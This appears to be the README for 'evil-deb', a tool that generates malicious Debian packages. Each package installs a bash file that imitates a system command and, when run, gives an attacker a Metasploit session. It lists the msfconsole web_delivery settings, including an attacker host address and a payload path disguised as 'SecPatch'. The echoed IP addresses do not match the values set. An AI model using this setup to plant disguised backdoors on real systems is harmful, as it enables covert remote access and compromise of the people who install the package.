# _______          _________ _         ______   _______  ______  
#(  ____ \|\     /|\__   __/( \       (  __  \ (  ____ \(  ___ \ 
#| (    \/| )   ( |   ) (   | (       | (  \  )| (    \/| (   ) )
#| (__    | |   | |   | |   | | _____ | |   ) || (__    | (__/ / 
#|  __)   ( (   ) )   | |   | |(_____)| |   | ||  __)   |  __ (  
#| (       \ \_/ /    | |   | |       | |   ) || (      | (  \ \ 
#| (____/\  \   /  ___) (___| (____/\ | (__/  )| (____/\| )___) )
#(_______/   \_/   \_______/(_______/ (______/ (_______/|/ \___/ 1.0v.
#                                                               
#                         Malicious Debain Package Creator
#                         WebSite :: http://www.haxkur.tk/
#			                               By: @Killerpop

##
# Information :::

#evil-deb is a script which generates Malicious debian package for metasploit
#which consists of bash file. the bash file is deployed into "/usr/local/bin/" directory.
#Bash file injects and acts like some system command which when executed by victim
#and attacker hits with session.

#evil-deb basically depends upon web_delivery module and every thing is automated.
#all the attacker needs is to do following settings :

#NOTE :: This project was made to be integrated with Venom Shellcode Generator 1.0.13.
#       It can be used standalone also all user needs is to change uripath in msf variables

#msf exploit(web_delivery) > set srvhost 192.168.0.2
#srvhost => 192.168.0.102
#msf exploit(web_delivery) > set uripath SecPatch
#uripath => SecPatch
#msf exploit(web_delivery) > set uripath /SecPatch
#uripath => /SecPatch
#msf exploit(web_delivery) > set Lhost 192.168.0.2
#Lhost => 192.168.0.102
#msf exploit(web_delivery) > show options
#msf exploit(web_delivery) > exploit

#Thanks for helping the project. By: @Killerpop
    -------------------------------------------------------------------------------------
    
    Tested on :
                Linux Mint 17.2 Cinnamon (Ubuntu 14.04) 
                ParrotOS (Debian Jessie)
                Kali Rolling 2017.3
                BackBox Linux 5
                Ubuntu 16.04
# Updates :::
       1.0v.
   
